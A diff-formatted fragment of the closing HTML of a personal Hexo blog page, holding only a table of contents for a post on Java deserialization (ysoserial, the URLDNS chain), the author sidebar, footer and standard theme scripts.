+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1"><span class="nav-number">1.</span> <span class="nav-text">Java安全[反序列化(1)]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ysoserial"><span class="nav-number">1.1.</span> <span class="nav-text">ysoserial</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#URL-DNS"><span class="nav-number">1.2.</span> <span class="nav-text">URL DNS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#URLDNS%E5%88%A9%E7%94%A8%E9%93%BE%E8%A7%A3%E6%9E%90"><span class="nav-number">1.2.1.</span> <span class="nav-text">URLDNS利用链解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.2.</span> <span class="nav-text">利用链利用过程</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ttoc"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Ttoc</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">51</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/try-to-change" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;try-to-change" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:wejoke3@gmail.com" title="E-Mail → mailto:wejoke3@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ttoc</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
